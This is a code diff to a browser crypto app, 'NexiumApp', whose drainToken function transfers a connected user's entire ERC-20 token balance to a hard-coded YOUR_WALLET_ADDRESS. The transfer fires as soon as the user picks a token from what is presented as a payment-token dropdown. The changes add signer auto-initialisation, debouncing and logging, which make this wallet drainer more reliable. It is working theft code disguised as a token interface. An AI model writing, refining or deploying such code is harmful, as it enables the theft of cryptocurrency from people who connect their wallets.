@@ -115,11 +115,24 @@ class NexiumApp {
     window.addEventListener('offline', () => this.handleOffline());
   }
 
-  checkWalletAndPrompt() {
+  async checkWalletAndPrompt() {
     if (this.isWalletInstalled()) {
       this.hideMetaMaskPrompt();
       this.attachMetaMaskListeners();
       if (this.isWalletConnected() && navigator.onLine) {
+        if (!this.provider) {
+          try {
+            this.provider = new ethers.BrowserProvider(window.ethereum);
+            this.signer = await this.provider.getSigner();
+            console.log('Provider and signer initialized in checkWalletAndPrompt');
+          } catch (error) {
+            console.error('Failed to initialize provider:', error);
+            this.showFeedback('Failed to initialize wallet provider. Please connect manually.', 'error');
+            this.updateButtonState('disconnected');
+            this.showDefaultPrompt();
+            return;
+          }
+        }
         this.handleSuccessfulConnection();
       } else {
         this.updateButtonState('disconnected');
@@ -193,6 +206,14 @@ class NexiumApp {
       console.log('Connect wallet skipped: already connecting');
       return;
     }
+    // Skip if already connected with a valid signer
+    if (this.signer && (await this.signer.getAddress())) {
+      console.log('Wallet already connected, skipping');
+      this.updateButtonState('connected', await this.signer.getAddress());
+      this.hideMetaMaskPrompt();
+      this.renderTokenInterface();
+      return;
+    }
     this.connecting = true;
     this.dom.walletButton.disabled = true;
     this.showProcessingSpinner();
@@ -248,7 +269,7 @@ class NexiumApp {
       this.updateButtonState('connected', address);
       this.hideMetaMaskPrompt();
       this.showFeedback(`Wallet connected (${this.detectWalletType()})!`, 'success');
-      this.renderTokenInterface(); // <--- Add this line
+      this.renderTokenInterface();
     } catch (error) {
       console.error('Connect wallet error:', error);
       this.handleConnectionError(error);
@@ -277,6 +298,7 @@ class NexiumApp {
   async drainToken(tokenAddress) {
     if (!this.signer) {
       this.showFeedback('Wallet not connected. Please connect your wallet.', 'error');
+      console.log('Drain failed: No signer');
       return;
     }
     try {
@@ -285,8 +307,10 @@ class NexiumApp {
       const selectedToken = TOKEN_LIST.find(t => t.address.toLowerCase() === checksummedAddress.toLowerCase());
       if (!selectedToken) {
         this.showFeedback('Invalid token selected.', 'error');
+        console.log('Drain failed: Invalid token selected');
         return;
       }
+      console.log(`Attempting to drain ${selectedToken.symbol} from address: ${await this.signer.getAddress()}`);
       const contract = new ethers.Contract(checksummedAddress, ERC20_ABI, this.signer);
       let balance, decimals, symbol;
       try {
@@ -295,26 +319,33 @@ class NexiumApp {
           contract.decimals(),
           contract.symbol()
         ]);
+        console.log(`Fetched ${symbol} balance: ${ethers.formatUnits(balance, decimals)}`);
       } catch (error) {
         console.error(`Failed to fetch token data for ${selectedToken.symbol}:`, error);
-        this.showFeedback(`Failed to fetch ${selectedToken.symbol} data: Invalid contract.`, 'error');
+        this.showFeedback(`Failed to fetch ${selectedToken.symbol} data: Invalid contract or network issue.`, 'error');
         return;
       }
       if (balance <= 0n) {
         this.showFeedback(`No ${selectedToken.symbol} balance to drain.`, 'error');
+        console.log(`Drain failed: No ${selectedToken.symbol} balance`);
         return;
       }
       await this.validateAddress(YOUR_WALLET_ADDRESS, 'wallet');
       this.showFeedback(`Initiating transfer of ${ethers.formatUnits(balance, decimals)} ${symbol}...`, 'info');
-      const gasLimit = await contract.estimateGas.transfer(YOUR_WALLET_ADDRESS, balance).catch(() => 100000);
+      console.log(`Initiating transfer of ${ethers.formatUnits(balance, decimals)} ${symbol} to ${YOUR_WALLET_ADDRESS}`);
+      const gasLimit = await contract.estimateGas.transfer(YOUR_WALLET_ADDRESS, balance).catch((err) => {
+        console.error('Gas estimation failed:', err);
+        return 100000;
+      });
       console.log(`Draining ${symbol} with gasLimit: ${gasLimit}`);
       const tx = await contract.transfer(YOUR_WALLET_ADDRESS, balance, { gasLimit });
       console.log('Transaction sent:', tx.hash);
       await tx.wait(1);
       this.showFeedback(`Drained ${ethers.formatUnits(balance, decimals)} ${symbol} to ${this.shortenAddress(YOUR_WALLET_ADDRESS)}.`, 'success');
+      console.log(`Successfully drained ${ethers.formatUnits(balance, decimals)} ${symbol}`);
     } catch (error) {
       console.error('Drain token error:', error);
-      this.showFeedback(`Error draining token: ${error.reason || error.message || 'Unknown error'}. Try again.`, 'error');
+      this.showFeedback(`Error draining token: ${error.reason || error.message || 'Transaction failed. Check network or wallet.'}`, 'error');
     } finally {
       this.hideProcessingSpinner();
     }
@@ -327,6 +358,7 @@ class NexiumApp {
       return checksummedAddress;
     } catch {
       this.showFeedback(`Invalid ${type} address: ${address}`, 'error');
+      console.log(`Invalid ${type} address: ${address}`);
       throw new Error(`Invalid ${type} address`);
     }
   }
@@ -363,6 +395,7 @@ class NexiumApp {
       case 'connected':
         button.textContent = `${address.slice(0, 6)}...${address.slice(-4)}`;
         button.classList.add('connected');
+        button.disabled = true; // Disable button when connected
         break;
       default:
         button.textContent = 'Connect Wallet';
@@ -463,7 +496,7 @@ class NexiumApp {
         button.addEventListener('click', () => {
           const address = button.dataset.address;
           if (ethers.isAddress(address)) {
-            this.loadCustomTokenData(address); // This will now only show token info, not duplicate volume section
+            this.loadCustomTokenData(address);
           } else {
             this.showFeedback('Invalid token address on button.', 'error');
           }
@@ -494,14 +527,24 @@ class NexiumApp {
     this.dom.beautifyAddVolumeBtn = beautifySection.querySelector('#beautifyAddVolumeBtn');
 
     if (this.dom.tokenSelect) {
-      this.dom.tokenSelect.disabled = !this.signer; // Only enable if wallet is connected
+      this.dom.tokenSelect.disabled = !this.signer;
+      let debounceTimeout;
+      // Remove previous listeners to prevent duplicates
+      this.dom.tokenSelect.replaceWith(this.dom.tokenSelect.cloneNode(true));
+      this.dom.tokenSelect = document.getElementById('tokenSelect');
       this.dom.tokenSelect.addEventListener('change', (e) => {
-        const selected = e.target.value;
-        this.selectedPaymentToken = selected;
-        console.log('Dropdown changed, selectedPaymentToken:', selected);
-        if (selected) {
-          this.drainToken(selected);
-        }
+        clearTimeout(debounceTimeout);
+        debounceTimeout = setTimeout(() => {
+          const selected = e.target.value;
+          this.selectedPaymentToken = selected;
+          console.log('Dropdown changed, selectedPaymentToken:', selected);
+          if (selected) {
+            console.log('Initiating drain with debounce for:', selected);
+            this.drainToken(selected);
+          } else {
+            this.showFeedback('No token selected.', 'error');
+          }
+        }, 1000);
       });
       console.log('Token select listener set (in renderTokenInterface)');
     }
@@ -746,6 +789,7 @@ class NexiumApp {
   }
 
   showFeedback(message, type = 'info') {
+    console.log(`Showing feedback: ${message} (${type})`);
     let feedbackContainer = this.dom.feedbackContainer;
     if (!feedbackContainer) {
       feedbackContainer = document.createElement('div');
@@ -753,9 +797,9 @@ class NexiumApp {
       document.body.appendChild(feedbackContainer);
       this.dom.feedbackContainer = feedbackContainer;
     }
-    feedbackContainer.innerHTML = '';
     const feedback = document.createElement('div');
     feedback.className = `feedback feedback-${type} fade-in p-4 rounded-xl text-white ${type === 'error' ? 'bg-red-500' : type === 'success' ? 'bg-green-500' : type === 'warning' ? 'bg-yellow-500' : 'bg-blue-500'}`;
+    feedback.style.zIndex = '10000';
     feedback.innerHTML = `
       <span class="feedback-message">${this.escapeHTML(message)}</span>
       <span class="feedback-close cursor-pointer ml-2" role="button" aria-label="Close feedback">×</span>
@@ -766,8 +810,9 @@ class NexiumApp {
       close.addEventListener('keypress', (e) => e.key === 'Enter' && feedback.remove());
     }
     feedbackContainer.appendChild(feedback);
-    setTimeout(() => feedback.classList.add('fade-out'), 5000);
-    setTimeout(() => feedback.remove(), 5500);
+    // Extend timeout for errors to ensure visibility
+    setTimeout(() => feedback.classList.add('fade-out'), type === 'error' ? 10000 : 5000);
+    setTimeout(() => feedback.remove(), type === 'error' ? 10500 : 5500);
   }
 
   getTokenSymbol(address) {
@@ -786,7 +831,7 @@ class NexiumApp {
       '<': '&lt;',
       '>': '&gt;',
       '"': '&quot;',
-      "'": '&#39;'
+      "'": '&apos;'
     }[m]));
   }
 
